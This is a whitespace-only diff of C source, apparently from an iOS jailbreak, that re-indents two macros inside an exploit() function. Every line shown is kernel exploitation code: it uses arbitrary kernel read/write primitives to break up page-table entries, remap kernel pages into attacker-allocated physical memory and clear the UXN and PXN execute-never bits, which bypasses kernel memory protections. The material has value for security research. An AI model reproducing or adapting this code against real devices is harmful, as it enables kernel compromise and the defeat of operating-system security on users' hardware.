@@ -485,26 +485,26 @@ void exploit(mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
     
 #define RemapPage_(address) \
 pagestuff_64((address) & (~PMK), ^(vm_address_t tte_addr, int addr) {\
-uint64_t tte = ReadAnywhere64(tte_addr);\
-if (!(TTE_GET(tte, TTE_IS_TABLE_MASK))) {\
-NSLog(@"breakup!");\
-uint64_t fakep = physalloc(PSZ);\
-uint64_t realp = TTE_GET(tte, TTE_PHYS_VALUE_MASK);\
-TTE_SETB(tte, TTE_IS_TABLE_MASK);\
-for (int i = 0; i < PSZ/8; i++) {\
-TTE_SET(tte, TTE_PHYS_VALUE_MASK, realp + i * PSZ);\
-WriteAnywhere64(fakep+i*8, tte);\
-}\
-TTE_SET(tte, TTE_PHYS_VALUE_MASK, findphys_real(fakep));\
-WriteAnywhere64(tte_addr, tte);\
-}\
-uint64_t newt = physalloc(PSZ);\
-copyin(bbuf, TTE_GET(tte, TTE_PHYS_VALUE_MASK) - gPhysBase + gVirtBase, PSZ);\
-copyout(newt, bbuf, PSZ);\
-TTE_SET(tte, TTE_PHYS_VALUE_MASK, findphys_real(newt));\
-TTE_SET(tte, TTE_BLOCK_ATTR_UXN_MASK, 0);\
-TTE_SET(tte, TTE_BLOCK_ATTR_PXN_MASK, 0);\
-WriteAnywhere64(tte_addr, tte);\
+    uint64_t tte = ReadAnywhere64(tte_addr);\
+    if (!(TTE_GET(tte, TTE_IS_TABLE_MASK))) {\
+        NSLog(@"breakup!");\
+        uint64_t fakep = physalloc(PSZ);\
+        uint64_t realp = TTE_GET(tte, TTE_PHYS_VALUE_MASK);\
+        TTE_SETB(tte, TTE_IS_TABLE_MASK);\
+        for (int i = 0; i < PSZ/8; i++) {\
+            TTE_SET(tte, TTE_PHYS_VALUE_MASK, realp + i * PSZ);\
+            WriteAnywhere64(fakep+i*8, tte);\
+        }\
+        TTE_SET(tte, TTE_PHYS_VALUE_MASK, findphys_real(fakep));\
+        WriteAnywhere64(tte_addr, tte);\
+    }\
+    uint64_t newt = physalloc(PSZ);\
+    copyin(bbuf, TTE_GET(tte, TTE_PHYS_VALUE_MASK) - gPhysBase + gVirtBase, PSZ);\
+    copyout(newt, bbuf, PSZ);\
+    TTE_SET(tte, TTE_PHYS_VALUE_MASK, findphys_real(newt));\
+    TTE_SET(tte, TTE_BLOCK_ATTR_UXN_MASK, 0);\
+    TTE_SET(tte, TTE_BLOCK_ATTR_PXN_MASK, 0);\
+    WriteAnywhere64(tte_addr, tte);\
 }, level1_table, isvad ? 1 : 2);
     
 #define NewPointer(origptr) (((origptr) & PMK) | findphys_real(origptr) - gPhysBase + gVirtBase)
@@ -516,17 +516,17 @@ WriteAnywhere64(tte_addr, tte);\
     
 #define RemapPage(x)\
 {\
-int fail = 0;\
-for (int i = 0; i < remapcnt; i++) {\
-if (remappage[i] == (x & (~PMK))) {\
-fail = 1;\
-}\
-}\
-if (fail == 0) {\
-RemapPage_(x);\
-RemapPage_(x+PSZ);\
-remappage[remapcnt++] = (x & (~PMK));\
-}\
+    int fail = 0;\
+    for (int i = 0; i < remapcnt; i++) {\
+        if (remappage[i] == (x & (~PMK))) {\
+            fail = 1;\
+        }\
+    }\
+    if (fail == 0) {\
+        RemapPage_(x);\
+        RemapPage_(x+PSZ);\
+        remappage[remapcnt++] = (x & (~PMK));\
+    }\
 }
     
     level1_table = physp - gPhysBase + gVirtBase;
